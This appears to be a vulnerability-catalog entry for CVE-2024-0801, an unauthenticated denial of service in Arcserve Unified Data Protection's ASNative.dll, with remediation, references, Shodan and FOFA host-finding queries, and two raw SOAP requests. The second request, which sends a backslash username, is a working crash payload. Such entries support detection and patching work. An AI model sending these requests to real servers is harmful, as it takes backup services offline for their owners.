_cves/2024/cve-2024-0801.md

---
layout: post
cve_id: CVE-2024-0801
title: Arcserve Unified Data Protection - Unauthenticated DoS in ASNative.dll
pcap: true
pcap_path: /pcaps/2024/CVE-2024-0801.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-0801.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: high
impact: 'Attackers can cause system crashes or unavailability, leading to service
  disruption and potential downtime.

  '
remediation: 'Update to the latest version of Arcserve Unified Data Protection or
  apply available patches.

  '
reference:
- https://www.tenable.com/security/research/tra-2024-07
- https://nvd.nist.gov/vuln/detail/CVE-2024-0801
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
  cvss-score: 7.5
  cve-id: CVE-2024-0801
  epss-score: 0.5403
  epss-percentile: 0.97911
  cwe-id: CWE-75
  cpe: cpe:2.3:a:arcserve:udp:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: arcserve
  product: udp
  shodan-query: http.favicon.hash:1015186617
  fofa-query: icon_hash="1015186617"
tags:
- cve
- cve2024
- arcserve
- intrusive
- vkev
---

## 🔍 Vulnerability Description
A denial of service vulnerability exists in Arcserve Unified Data Protection 9.2 and 8.1 in ASNative.dll.


## 🌐 HTTP Request
```nohighlight
POST /management/services/EdgeServiceConsoleImpl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Length: 292
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:validateUserByUser xmlns:ns2="http://webservice.edge.arcserve.ca.com/"><arg0>TbHrkY</arg0><arg1>WnQJ44qP</arg1><arg2>domain</arg2></ns2:validateUserByUser></S:Body></S:Envelope>
```

```nohighlight
POST /management/services/EdgeServiceConsoleImpl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Content-Length: 287
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:validateUserByUser xmlns:ns2="http://webservice.edge.arcserve.ca.com/"><arg0>\</arg0><arg1>WnQJ44qP</arg1><arg2>domain</arg2></ns2:validateUserByUser></S:Body></S:Envelope>
```

